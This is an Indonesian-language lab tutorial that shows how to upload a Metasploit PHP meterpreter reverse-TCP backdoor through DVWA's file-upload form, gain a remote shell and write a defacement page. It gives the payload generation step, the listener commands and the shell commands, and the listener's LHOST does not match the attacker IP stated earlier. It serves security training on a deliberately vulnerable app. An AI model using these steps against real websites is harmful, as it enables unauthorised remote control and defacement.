## Lesson 8 : Upload PHP Backdoor Payload 

Pada lesson ini mengajarkan cara membuat backdoor pada website dengan cara memanfaatkan form upload file. pembuatan backdoor dengan payload yang sudah disediakan ada msfconsole. 

NOTE
----

* ip website dvwa : 192.168.56.102
* ip backtack 	: 192.168.56.101

| **Langkah 1: Membuat Reverse TCP Payload** |
| :--- |

1. Pada backtrack masuk ke direktori `/root/backdoor/`     

2. Membuat reverse tcp payload dengan menggunakan `msfpayload php/meterpreter/reverse_tcp`. buat file payload dengan command berikut

![](/assets/lesson8/2.PNG)

3. Setelah file payload terbuat, buka dengan vi dan hilangkan tanda '#' agar script bisa berjalan. dengan cara menjalankan 
	* `vi PHONE_HOME.php`
	* tekan 'x' untuk menghapus 
	* masukkan ":wq!"

| **Langkah 2: Membuat Reverse TCP Listener** |
| :--- |

1. Pada backtrack buka msfconsole dengan menjalankan command `msfconsole` untuk masuk ke metasploit

2. Setelah itu jalankan command berikut untuk membuat reverse tcp listener
	``
		use exploit/multi/handler
		set PAYLOAD php/meterpreter/reverse_tcp
		set LHOST 192.168.1.105
		set LPORT 4444
		exploit
	``

![](/assets/lesson8/3.png)

| **Langkah 3: Mengunggah Script Payload Pada DVWA** |
| :--- |

1. Lakukan login pada dvwa

![](/assets/lesson8/4.png)	

2. Set DVWA Security ke low

![](/assets/lesson8/5.png)	

3. Buka menu Upload, pada form upload pilih file PHONE_HOME.php yang telah dibuat sebelumnya

![](/assets/lesson8/6.png)	

4. File PHONE_HOME.php akan disimpan pada 192.168.56.102/dvwa/hackable/uploads/ .

![](/assets/lesson8/7.png)	

| **Langkah 4: Menggunakan Payload untuk Mengendalikan DVWA** |
| :--- |

1. Pada link tempat file disimpan, klik file agar dvwa menjalankan file tersebut.

![](/assets/lesson8/7.png)	

2. Buka msfconsole untuk melakukan command terhadap dvwa. Pada msfconsole akan muncul meterpreter kemudian masukkan command `shell` untuk dapat memulai shell scripting

3. Jalankan command berikut pada
	``
		uptime
		pwd
		whoami
		w
		echo "Hacked at 4-23-2012, by Your Name" > hacked.html
		ls -l
	``

![](/assets/lesson8/8.png)

4. Dari command tersebut akan terbuat file hacked.html pada 192.168.56.102/dvwa/hackable/uploads/hacked.html

![](/assets/lesson8/9.png)
      